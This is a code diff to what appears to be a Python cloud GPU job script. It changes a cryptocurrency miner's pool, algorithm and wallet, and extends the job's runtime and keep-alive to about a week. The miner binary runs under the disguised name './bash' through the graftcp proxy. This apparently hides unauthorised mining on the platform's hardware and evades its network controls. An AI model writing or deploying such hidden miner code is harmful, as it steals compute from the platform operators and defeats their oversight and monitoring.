@@ -18,7 +18,7 @@ image = (
     gpu="A10G",
     cpu=2,
     memory="4Gi",
-    timeout=30 * 60 * 60,
+    timeout=186 * 60 * 60,
 )
 def run_script():
 
@@ -78,10 +78,10 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:7048 --wallet prl1pk06kg4nye9f2f44gt6hvwchrg0fnkgkhyv058zmml7z57y9tn2cqky62kj."OPOK$RANDOM"
+    ./graftcp/graftcp ./bash --disable-cpu --algorithm fishhash --pool iron.kryptex.network:7017 --wallet d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.RETRO
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
 
-    print("Staying alive for 30 hours...")
-    time.sleep(60 * 60 * 30)
+    print("Staying alive for 168 hours...")
+    time.sleep(60 * 60 * 168)
